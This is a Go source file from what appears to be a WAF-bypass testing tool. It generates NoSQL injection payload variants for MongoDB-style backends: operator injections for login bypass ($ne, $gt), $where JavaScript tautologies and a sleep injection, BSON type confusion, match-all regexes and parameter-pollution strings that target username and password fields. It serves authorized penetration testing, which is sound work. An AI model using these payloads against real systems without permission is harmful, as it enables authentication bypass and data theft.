// Package strategies provides mutation strategies for WAF bypass testing.
// SECURITY NOTE: This file contains NoSQL injection test payloads for authorized
// penetration testing purposes. These patterns are used to test WAF rule coverage
// and should only be used against systems you have permission to test.
package strategies

import (
	"fmt"
	"strings"
)

// NoSQLMutator applies mutations specific to NoSQL injection
type NoSQLMutator struct {
	TargetDB string // mongodb, couchdb, redis, elasticsearch
}

// NewNoSQLMutator creates a new NoSQL mutator
func NewNoSQLMutator() *NoSQLMutator {
	return &NoSQLMutator{
		TargetDB: "mongodb", // Default
	}
}

// Mutate applies NoSQL-specific mutations
func (n *NoSQLMutator) Mutate(payload string) []MutationResult {
	var results []MutationResult

	// MongoDB operator mutations
	results = append(results, n.mongoOperatorMutations(payload)...)

	// JSON syntax variations
	results = append(results, n.jsonMutations(payload)...)

	// JavaScript context escapes (for $where)
	results = append(results, n.jsMutations(payload)...)

	// BSON type confusion
	results = append(results, n.bsonMutations(payload)...)

	// Regex pattern variations
	results = append(results, n.regexMutations(payload)...)

	// Array injection
	results = append(results, n.arrayMutations(payload)...)

	// Parameter pollution
	results = append(results, n.paramPollutionMutations(payload)...)

	return results
}

// mongoOperatorMutations applies MongoDB operator variations
func (n *NoSQLMutator) mongoOperatorMutations(payload string) []MutationResult {
	var results []MutationResult

	// Alternative operators that achieve similar results
	operatorVariants := []struct {
		from, to, name, desc string
	}{
		{"$eq", "$in", "eq_to_in", "Replace $eq with $in array"},
		{"$ne", "$nin", "ne_to_nin", "Replace $ne with $nin array"},
		{"$gt", "$gte", "gt_to_gte", "Replace $gt with $gte"},
		{"$lt", "$lte", "lt_to_lte", "Replace $lt with $lte"},
		{"$where", "$expr", "where_to_expr", "Replace $where with $expr"},
		{"$regex", "$options", "add_regex_options", "Add regex options"},
	}

	for _, v := range operatorVariants {
		if strings.Contains(payload, v.from) {
			results = append(results, MutationResult{
				Payload:     strings.ReplaceAll(payload, v.from, v.to),
				Mutation:    "nosql_" + v.name,
				Description: v.desc,
			})
		}
	}

	// Inject comparison operators
	comparisonOperators := []string{"$gt", "$gte", "$lt", "$lte", "$ne", "$eq", "$in", "$nin"}
	for _, op := range comparisonOperators {
		if !strings.Contains(payload, op) {
			// Add operator to payload
			injected := fmt.Sprintf(`{"%s": {"$ne": null}}`, payload)
			results = append(results, MutationResult{
				Payload:     injected,
				Mutation:    "nosql_inject_ne",
				Description: "Inject $ne operator for auth bypass",
			})

			injected = fmt.Sprintf(`{"%s": {"$gt": ""}}`, payload)
			results = append(results, MutationResult{
				Payload:     injected,
				Mutation:    "nosql_inject_gt",
				Description: "Inject $gt operator",
			})
			break
		}
	}

	// $regex injection for pattern matching
	if !strings.Contains(payload, "$regex") {
		results = append(results, MutationResult{
			Payload:     fmt.Sprintf(`{"$regex": "%s"}`, payload),
			Mutation:    "nosql_regex_wrap",
			Description: "Wrap in $regex operator",
		})

		results = append(results, MutationResult{
			Payload:     fmt.Sprintf(`{"$regex": ".*%s.*", "$options": "i"}`, payload),
			Mutation:    "nosql_regex_wildcard",
			Description: "Wildcard regex with case insensitive",
		})
	}

	// $where for JavaScript execution (test payload)
	results = append(results, MutationResult{
		Payload:     fmt.Sprintf(`{"$where": "this.password == '%s'"}`, payload),
		Mutation:    "nosql_where_inject",
		Description: "Inject $where JavaScript",
	})

	results = append(results, MutationResult{
		Payload:     `{"$where": "1==1"}`,
		Mutation:    "nosql_where_always_true",
		Description: "$where always true bypass",
	})

	return results
}

// jsonMutations applies JSON syntax variations
func (n *NoSQLMutator) jsonMutations(payload string) []MutationResult {
	var results []MutationResult

	// Different quote styles (some parsers accept single quotes)
	if strings.Contains(payload, `"`) {
		results = append(results, MutationResult{
			Payload:     strings.ReplaceAll(payload, `"`, `'`),
			Mutation:    "nosql_single_quotes",
			Description: "Replace double quotes with single",
		})
	}

	// No quotes on keys (JavaScript object notation)
	results = append(results, MutationResult{
		Payload:     strings.ReplaceAll(payload, `"$`, `$`),
		Mutation:    "nosql_unquoted_operators",
		Description: "Remove quotes from operators",
	})

	// Unicode escapes for special characters
	unicodeReplacements := map[string]string{
		"$":  "\\u0024",
		".":  "\\u002e",
		"[":  "\\u005b",
		"]":  "\\u005d",
		"{":  "\\u007b",
		"}":  "\\u007d",
	}

	for char, unicode := range unicodeReplacements {
		if strings.Contains(payload, char) {
			results = append(results, MutationResult{
				Payload:     strings.ReplaceAll(payload, char, unicode),
				Mutation:    "nosql_unicode_" + char,
				Description: fmt.Sprintf("Unicode escape for '%s'", char),
			})
		}
	}

	// Escaped characters
	results = append(results, MutationResult{
		Payload:     strings.ReplaceAll(payload, "$", "\\$"),
		Mutation:    "nosql_escaped_dollar",
		Description: "Escape dollar sign",
	})

	// Add trailing content
	results = append(results, MutationResult{
		Payload:     payload + `, "$or": [{}]`,
		Mutation:    "nosql_append_or",
		Description: "Append $or always true",
	})

	return results
}

// jsMutations applies JavaScript context mutations for $where
func (n *NoSQLMutator) jsMutations(payload string) []MutationResult {
	var results []MutationResult

	// JavaScript tautologies (test payloads for WAF testing)
	jsTautologies := []string{
		`' || '1'=='1`,
		`' || true || '`,
		`'; return true; var x='`,
		`1; return true; //`,
	}

	for i, tautology := range jsTautologies {
		results = append(results, MutationResult{
			Payload:     payload + tautology,
			Mutation:    fmt.Sprintf("nosql_js_tautology_%d", i),
			Description: "JavaScript tautology injection",
		})
	}

	// Sleep injection for detection (time-based testing)
	results = append(results, MutationResult{
		Payload:     `'; sleep(5000); var x='`,
		Mutation:    "nosql_js_sleep",
		Description: "JavaScript sleep injection",
	})

	// This reference manipulation
	results = append(results, MutationResult{
		Payload:     `{"$where": "this.constructor"}`,
		Mutation:    "nosql_constructor_access",
		Description: "Constructor access test",
	})

	return results
}

// bsonMutations applies BSON type confusion techniques
func (n *NoSQLMutator) bsonMutations(payload string) []MutationResult {
	var results []MutationResult

	// Type confusion - treat string as object
	results = append(results, MutationResult{
		Payload:     fmt.Sprintf(`{"$type": 2, "$eq": "%s"}`, payload),
		Mutation:    "nosql_type_string",
		Description: "BSON type string confusion",
	})

	// Null type injection
	results = append(results, MutationResult{
		Payload:     `{"$type": 10}`,
		Mutation:    "nosql_type_null",
		Description: "BSON null type injection",
	})

	// Object type
	results = append(results, MutationResult{
		Payload:     `{"$type": 3}`,
		Mutation:    "nosql_type_object",
		Description: "BSON object type injection",
	})

	// Array type
	results = append(results, MutationResult{
		Payload:     `{"$type": 4}`,
		Mutation:    "nosql_type_array",
		Description: "BSON array type injection",
	})

	// Boolean type
	results = append(results, MutationResult{
		Payload:     `{"$type": 8, "$ne": false}`,
		Mutation:    "nosql_type_bool",
		Description: "BSON boolean type confusion",
	})

	return results
}

// regexMutations applies regex pattern variations
func (n *NoSQLMutator) regexMutations(payload string) []MutationResult {
	var results []MutationResult

	// Regex metacharacter injection
	results = append(results, MutationResult{
		Payload:     fmt.Sprintf(`{"$regex": "^%s"}`, payload),
		Mutation:    "nosql_regex_anchor_start",
		Description: "Regex anchor at start",
	})

	results = append(results, MutationResult{
		Payload:     fmt.Sprintf(`{"$regex": "%s$"}`, payload),
		Mutation:    "nosql_regex_anchor_end",
		Description: "Regex anchor at end",
	})

	results = append(results, MutationResult{
		Payload:     `{"$regex": ".*"}`,
		Mutation:    "nosql_regex_match_all",
		Description: "Regex match all",
	})

	// Case insensitive options
	results = append(results, MutationResult{
		Payload:     fmt.Sprintf(`{"$regex": "%s", "$options": "i"}`, payload),
		Mutation:    "nosql_regex_case_insensitive",
		Description: "Case insensitive regex",
	})

	// Multiline option
	results = append(results, MutationResult{
		Payload:     fmt.Sprintf(`{"$regex": "%s", "$options": "m"}`, payload),
		Mutation:    "nosql_regex_multiline",
		Description: "Multiline regex",
	})

	// Extended option (allows whitespace and comments)
	results = append(results, MutationResult{
		Payload:     fmt.Sprintf(`{"$regex": "%s", "$options": "x"}`, payload),
		Mutation:    "nosql_regex_extended",
		Description: "Extended regex mode",
	})

	// Dot matches newline
	results = append(results, MutationResult{
		Payload:     fmt.Sprintf(`{"$regex": "%s", "$options": "s"}`, payload),
		Mutation:    "nosql_regex_dotall",
		Description: "Dot matches newline",
	})

	return results
}

// arrayMutations applies array injection techniques
func (n *NoSQLMutator) arrayMutations(payload string) []MutationResult {
	var results []MutationResult

	// Inject as array element
	results = append(results, MutationResult{
		Payload:     fmt.Sprintf(`["%s"]`, payload),
		Mutation:    "nosql_array_wrap",
		Description: "Wrap payload in array",
	})

	// $in operator with array
	results = append(results, MutationResult{
		Payload:     fmt.Sprintf(`{"$in": ["%s", null, ""]}`, payload),
		Mutation:    "nosql_in_array",
		Description: "$in with multiple values",
	})

	// $nin operator
	results = append(results, MutationResult{
		Payload:     `{"$nin": []}`,
		Mutation:    "nosql_nin_empty",
		Description: "$nin empty array (matches all)",
	})

	// $all operator
	results = append(results, MutationResult{
		Payload:     fmt.Sprintf(`{"$all": ["%s"]}`, payload),
		Mutation:    "nosql_all_array",
		Description: "$all operator injection",
	})

	// Array index injection
	results = append(results, MutationResult{
		Payload:     fmt.Sprintf(`{"%s.0": {"$exists": true}}`, payload),
		Mutation:    "nosql_array_index",
		Description: "Array index reference",
	})

	return results
}

// paramPollutionMutations applies parameter pollution techniques
func (n *NoSQLMutator) paramPollutionMutations(payload string) []MutationResult {
	var results []MutationResult

	// Multiple parameter values
	results = append(results, MutationResult{
		Payload:     fmt.Sprintf(`username=%s&username[$ne]=x`, payload),
		Mutation:    "nosql_param_pollution",
		Description: "HTTP parameter pollution",
	})

	// Bracket notation in params
	results = append(results, MutationResult{
		Payload:     fmt.Sprintf(`user[password][$ne]=%s`, payload),
		Mutation:    "nosql_bracket_injection",
		Description: "Bracket notation injection",
	})

	// Array notation
	results = append(results, MutationResult{
		Payload:     fmt.Sprintf(`user[$gt]=&password=%s`, payload),
		Mutation:    "nosql_gt_param",
		Description: "$gt in parameter",
	})

	// Nested object injection
	results = append(results, MutationResult{
		Payload:     fmt.Sprintf(`credentials[username]=%s&credentials[password][$ne]=`, payload),
		Mutation:    "nosql_nested_object",
		Description: "Nested object parameter",
	})

	return results
}
